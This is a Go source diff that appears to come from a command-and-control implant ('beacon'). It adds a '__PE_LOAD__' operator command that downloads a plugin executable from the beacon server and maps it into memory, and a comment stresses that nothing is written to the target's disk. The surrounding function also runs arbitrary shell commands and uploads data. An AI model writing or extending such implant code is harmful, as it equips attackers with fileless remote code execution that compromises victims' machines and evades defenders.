@@ -398,7 +398,38 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		}
 		return result, "cloud_upload"
 	}
+	if strings.HasPrefix(trimmed, "__PE_LOAD__") {
+		result, err := loadPluginCommand(client, cfg, trimmed)
+		if err != nil {
+			return "Plugin failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
 	return runCommand(trimmed)
+}
+
+// loadPluginCommand parses the __PE_LOAD__ operator command. The plugin is
+// fetched from the beacon server on demand and mapped in memory; no file
+// is written to the target disk.
+func loadPluginCommand(client *http.Client, cfg *config, command string) (string, error) {
+	fields := strings.SplitN(strings.TrimSpace(command), " ", 4)
+	if len(fields) < 2 || fields[1] == "" {
+		return "", errors.New("__PE_LOAD__ requires a plugin name")
+	}
+	pluginToken := fields[1]
+	exportName := "Run"
+	if len(fields) > 2 && fields[2] != "" {
+		exportName = fields[2]
+	}
+	input := ""
+	if len(fields) > 3 {
+		input = fields[3]
+	}
+	url := pluginToken
+	if !strings.HasPrefix(pluginToken, "/") {
+		url = "/tools/plugins/" + pluginToken
+	}
+	return loadPluginPE(client, cfg, url, exportName, input)
 }
 
 func runCommand(command string) (string, string) {
